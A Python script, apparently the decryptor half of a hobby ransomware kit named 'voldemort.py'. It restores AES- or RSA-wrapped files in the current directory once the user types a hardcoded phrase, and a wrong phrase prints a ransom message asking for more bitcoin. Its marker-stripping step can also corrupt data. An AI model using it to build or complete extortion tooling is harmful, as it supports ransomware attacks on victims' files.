#!/usr/bin/env python3

import os
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization,  hashes

# Marker zur Kennzeichnung verschlüsselter Dateien
MARKER = "ENCRYPTED"


# AES Schlüssel entschlüsseln
def aes_decrypt(aes_key, encrypted_data):
    iv = encrypted_data[:16]
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    data = decryptor.update(encrypted_data[16:]) + decryptor.finalize()
    return data

# RSA Schlüssel entschlüsseln
def rsa_decrypt(private_key, encrypted_data):
    data = private_key.decrypt(
        encrypted_data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return data

# Auswahl der Enschlüsselung zwischen AES und RSA
def main():
    print("Wähle den Verschüsselungsalgorithmus:")
    print("1. AES")
    print("2. RSA")
    choice = input("Deine Wahl (1 oder 2): ")

    if choice == "1":
        with open("thekey.key", "rb") as key_file:
            aes_key = key_file.read()
        decrypt_func = lambda data: aes_decrypt(aes_key, data)
        print("AES Schlüssel geladen.")
    elif choice == "2":
        with open("thekey.key", "rb") as key_file:
            rsa_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
            backend=default_backend()
            )
        with open("aes_key.enc", "rb") as key_file:
            encrypted_aes_key = key_file.read()
        aes_key = rsa_decrypt(rsa_key, encrypted_aes_key)
        decrypt_func = lambda data: aes_decrypt(aes_key, data)
        print("RSA Schlüssel geladen.")
    else:
        print("Ungültige Wahl!")
        return

# Dateien speichern
    files = []

# Filter welche Dokumente nicht verschlüsselt werden dürfen
    for file in os.listdir():
        if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py" or file == "aes_key.enc" or file.startswith('.'):
            continue
# Dateien finden
        if os.path.isfile(file):
            files.append(file)
    print("Files to decrypt:", files)

# Passwort
    secretphrase = "Avada Kedavra"

# Eingabe für das Passwort
    user_phrase = input("Enter the secret phrase to decrypt your files\n")

    if user_phrase == secretphrase:
        for file in files:
            file_path = Path(file)
            with file_path.open("rb") as thefile:
                contents = thefile.read()

# Kontrolliert ob die Datei schon Verschlüsselt ist 
            if MARKER.encode() not in contents:
                print(f"{file} is not encrypted or already decrypted.")
                continue

 # Entferne den Marker vor dem Entschlüsseln
            contents = contents.replace(MARKER.encode(), b'')

            try:
            # Entschlüssele den Inhalt
                decrypted_data = decrypt_func(contents)
                with file_path.open("wb") as thefile:
                    thefile.write(decrypted_data)
            except Exception as e:
                print(f"Failed to decrypt {file}: {str(e)}")
                continue

        print("Congrats, your files are decrypted")
    else:
        print("Wrong secret phrase, send me more bitcoin")

if __name__ ==  "__main__":
    main()
